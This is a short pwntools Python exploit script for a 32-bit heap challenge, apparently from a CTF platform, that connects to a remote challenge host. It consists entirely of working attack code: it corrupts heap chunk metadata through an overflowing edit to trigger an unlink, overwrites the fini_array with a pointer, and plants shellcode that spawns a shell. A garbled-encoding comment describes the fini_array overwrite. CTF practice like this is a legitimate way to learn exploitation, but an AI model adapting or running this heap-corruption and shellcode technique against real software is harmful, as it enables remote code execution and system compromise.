from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
elf = ELF("./pwn")
#p = elf.process()

p = remote("node2.buuoj.cn.wetolink.com",28994)
def dbg():
    gdb.attach(p)
    p.interactive()

ptr = 0x80eba40+12
fini = 0x80e9f74

def add(size, content):
	p.sendline("1")
	p.sendline(str(size))
	p.sendline(content)

def edit(idx, content):
	p.sendline("3")	
	p.sendline(str(idx))
	p.sendline(content)

def free(idx):
	p.sendline("2")
	p.sendline(str(idx))
def exp():
	p.recvuntil("input:\n")	
	add(0x50, '1')#0	
	add(0x20, '1')#1	
	add(0x50, 'a')#2	
	add(0x54, 'b')#3
	add(0x50, 'c')#4
	add(0x20, 'd')#5
	edit(3, 'a'*0x54)
	payload = 'ffff'+p32(0x51)+p32(ptr-12)+p32(ptr-8)
	payload = payload.ljust(0x50, 'a') + p32(0x50) + p32(0x58)
	edit(3, payload)
	free(4)	
	edit(3, p32(fini))
	edit(0, p32(0) + p32(fini+8) + asm(shellcraft.sh()))	#ÐÞ¸Äfini_arrar[1]È¥Ö´ÐÐshellcode
	p.interactive()
if __name__ == '__main__':
	exp()
